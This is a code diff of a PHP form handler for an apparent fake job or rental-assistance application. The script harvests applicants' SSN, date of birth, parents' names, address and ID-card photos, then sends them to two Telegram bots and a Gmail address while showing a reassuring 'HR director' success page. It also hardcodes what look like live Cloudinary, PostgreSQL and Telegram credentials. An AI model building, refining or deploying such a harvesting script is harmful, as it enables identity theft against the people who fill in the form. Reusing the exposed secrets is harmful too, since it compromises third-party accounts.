@@ -7,25 +7,13 @@ error_reporting(E_ALL);
 ini_set('display_errors', 1);
 
 // ======================
-// CLOUDINARY SETUP
+// CLOUDINARY SETTINGS
 // ======================
-require 'vendor/autoload.php';
-
-use Cloudinary\Cloudinary;
-
-$cloudinary = new Cloudinary([
-    'cloud' => [
-        'cloud_name' => 'dlddiquex',
-        'api_key'    => '671373236729178',
-        'api_secret' => 'cmCL1elCACDX0NB5g-pMMMFJens'
-    ],
-    'url' => [
-        'secure' => true
-    ]
-]);
+$cloudName = "dlddiquex";
+$uploadPreset = "cloudinary://671373236729178:cmCL1elCACDX0NB5g-pMMMFJens@dlddiquex";
 
 // ======================
-// NEON DATABASE (PostgreSQL)
+// NEON DATABASE
 // ======================
 $host = "ep-calm-frog-ahfjj5vo-pooler.c-3.us-east-1.aws.neon.tech";
 $db   = "neondb";
@@ -33,13 +21,16 @@ $user = "neondb_owner";
 $pass = "npg_TQ1gBOwA9rCa";
 $port = "5432";
 
-$dsn = "pgsql:host=$host;port=$port;dbname=$db";
+$dsn = "pgsql:host=$host;port=$port;dbname=$db;sslmode=require";
 
 try {
+
     $pdo = new PDO($dsn, $user, $pass, [
         PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
     ]);
+
 } catch (Exception $e) {
+
     die("DB Connection failed: " . $e->getMessage());
 }
 
@@ -72,37 +63,52 @@ $mother_name = $_POST['mother_name'] ?? '';
 $address = $address_line1 . " " . $address_line2 . ", " . $city . ", " . $state . " " . $zip_code;
 
 // ======================
-// CLOUDINARY UPLOAD FUNCTION
+// CLOUDINARY UPLOAD
 // ======================
-function uploadFile($file) {
-
-    global $cloudinary;
+function uploadToCloudinary($file, $cloudName, $uploadPreset) {
 
     if (!isset($file) || $file['error'] !== 0) {
         return null;
     }
 
-    try {
+    $url = "https://api.cloudinary.com/v1_1/$cloudName/image/upload";
 
-        $upload = $cloudinary->uploadApi()->upload(
-            $file['tmp_name'],
-            [
-                'folder' => 'job_applications'
-            ]
-        );
+    $postFields = [
+        'file' => new CURLFile($file['tmp_name']),
+        'upload_preset' => $uploadPreset,
+        'folder' => 'job_applications'
+    ];
 
-        return $upload['secure_url'];
+    $ch = curl_init();
 
-    } catch (Exception $e) {
-        return null;
-    }
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+    $response = curl_exec($ch);
+
+    curl_close($ch);
+
+    $result = json_decode($response, true);
+
+    return $result['secure_url'] ?? null;
 }
 
 // ======================
 // UPLOAD FILES
 // ======================
-$front_url = uploadFile($_FILES['front_id'] ?? null);
-$back_url  = uploadFile($_FILES['back_id'] ?? null);
+$front_url = uploadToCloudinary(
+    $_FILES['front_id'] ?? null,
+    $cloudName,
+    $uploadPreset
+);
+
+$back_url = uploadToCloudinary(
+    $_FILES['back_id'] ?? null,
+    $cloudName,
+    $uploadPreset
+);
 
 // ======================
 // SAVE TO DATABASE
@@ -145,12 +151,12 @@ $stmt->execute([
 ]);
 
 // ======================
-// TELEGRAM BOT SETUP
+// TELEGRAM SETTINGS
 // ======================
 $bot1 = "8538050369:AAGHLSy5D7r-_6QA9K1rbqkebWrzpbjc1ek";
 $chat1 = "6513265609";
 
-$bot2 = "YOUR_BOT_TOKEN_22";
+$bot2 = "YOUR_BOT_TOKEN_2";
 $chat2 = "5469294503";
 
 // ======================
@@ -175,21 +181,22 @@ function sendTelegram($bot, $method, $data) {
 }
 
 // ======================
-// MESSAGE TEXT
+// MESSAGE
 // ======================
-$text = "📄 New Application Submitted\n\n"
-. "👤 Name: $first_name $middle_name $last_name\n"
-. "📞 Phone: $phone\n"
-. "📧 Email: $email\n"
-. "🎂 DOB: $dob\n"
-. "🏠 Address: $address\n"
-. "🏙 Birth City: $birth_city\n"
-. "👨 Father: $father_name\n"
-. "👩 Mother: $mother_name\n"
-. "🧾 SSN: $ssn";
+$text = "📄 New Application Submitted\n\n";
+
+$text .= "👤 Name: $first_name $middle_name $last_name\n";
+$text .= "📞 Phone: $phone\n";
+$text .= "📧 Email: $email\n";
+$text .= "🎂 DOB: $dob\n";
+$text .= "🏠 Address: $address\n";
+$text .= "🏙 Birth City: $birth_city\n";
+$text .= "👨 Father: $father_name\n";
+$text .= "👩 Mother: $mother_name\n";
+$text .= "🧾 SSN: $ssn";
 
 // ======================
-// SEND TO BOT 1
+// SEND BOT 1
 // ======================
 sendTelegram($bot1, "sendMessage", [
     "chat_id" => $chat1,
@@ -197,6 +204,7 @@ sendTelegram($bot1, "sendMessage", [
 ]);
 
 if (!empty($front_url)) {
+
     sendTelegram($bot1, "sendPhoto", [
         "chat_id" => $chat1,
         "photo" => $front_url,
@@ -205,6 +213,7 @@ if (!empty($front_url)) {
 }
 
 if (!empty($back_url)) {
+
     sendTelegram($bot1, "sendPhoto", [
         "chat_id" => $chat1,
         "photo" => $back_url,
@@ -213,7 +222,7 @@ if (!empty($back_url)) {
 }
 
 // ======================
-// SEND TO BOT 2
+// SEND BOT 2
 // ======================
 sendTelegram($bot2, "sendMessage", [
     "chat_id" => $chat2,
@@ -221,6 +230,7 @@ sendTelegram($bot2, "sendMessage", [
 ]);
 
 if (!empty($front_url)) {
+
     sendTelegram($bot2, "sendPhoto", [
         "chat_id" => $chat2,
         "photo" => $front_url,
@@ -229,6 +239,7 @@ if (!empty($front_url)) {
 }
 
 if (!empty($back_url)) {
+
     sendTelegram($bot2, "sendPhoto", [
         "chat_id" => $chat2,
         "photo" => $back_url,
@@ -237,11 +248,14 @@ if (!empty($back_url)) {
 }
 
 // ======================
-// EMAIL NOTIFICATION
+// EMAIL
 // ======================
 $to = "collaomn@gmail.com";
+
 $subject = "New Job Form Submission";
+
 $body = $text;
+
 $headers = "From: noreply@homeandrentalassistance.onrender.com";
 
 @mail($to, $subject, $body, $headers);
@@ -250,33 +264,112 @@ $headers = "From: noreply@homeandrentalassistance.onrender.com";
 // SUCCESS PAGE
 // ======================
 echo "
-<div style='
-    max-width:700px;
-    margin:60px auto;
-    padding:50px;
-    background:#0f172a;
-    color:white;
-    border-radius:20px;
-    text-align:center;
+
+<!DOCTYPE html>
+
+<html lang='en'>
+
+<head>
+
+<meta charset='UTF-8'>
+
+<meta name='viewport' content='width=device-width, initial-scale=1.0'>
+
+<title>Application Submitted</title>
+
+<style>
+
+body{
+    margin:0;
+    padding:0;
+    background:#020617;
     font-family:Arial,sans-serif;
-    box-shadow:0 10px 30px rgba(0,0,0,0.4);
-'>
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh;
+}
 
-    <div style='font-size:80px;color:#22c55e;margin-bottom:20px;'>✓</div>
+.success-box{
+    width:90%;
+    max-width:750px;
+    background:#0f172a;
+    padding:50px;
+    border-radius:25px;
+    text-align:center;
+    color:white;
+    box-shadow:0 10px 40px rgba(0,0,0,0.5);
+}
 
-    <h1 style='font-size:42px;margin-bottom:25px;'>Form Submitted Successfully!</h1>
+.check{
+    font-size:90px;
+    color:#22c55e;
+    margin-bottom:20px;
+}
 
-    <p style='font-size:24px;line-height:1.8;'>
-        Thank you for considering <strong>Apartment at Home and Rental Assistance</strong>.
-        <br><br>
-        We will contact you shortly.
-    </p>
+h1{
+    font-size:42px;
+    margin-bottom:20px;
+}
 
-    <div style='margin-top:40px;border-top:1px solid #334155;padding-top:25px;'>
-        <h2 style='font-size:30px;color:#38bdf8;'>Taylor Luis</h2>
-        <p style='font-size:20px;color:#cbd5e1;'>Director of Human Resources</p>
-    </div>
+p{
+    font-size:22px;
+    line-height:1.8;
+    color:#cbd5e1;
+}
+
+hr{
+    border:none;
+    border-top:1px solid #334155;
+    margin:40px 0;
+}
+
+.director{
+    font-size:32px;
+    color:#38bdf8;
+    margin-bottom:10px;
+}
+
+.role{
+    font-size:20px;
+    color:#94a3b8;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class='success-box'>
+
+<div class='check'>✓</div>
+
+<h1>Form Submitted Successfully!</h1>
+
+<p>
+Thank you for considering
+<strong>Apartment at Home and Rental Assistance</strong>.
+<br><br>
+We will contact you shortly.
+</p>
+
+<hr>
+
+<div class='director'>
+Taylor Luis
+</div>
+
+<div class='role'>
+Director of Human Resources
+</div>
 
 </div>
+
+</body>
+
+</html>
+
 ";
+
 ?>
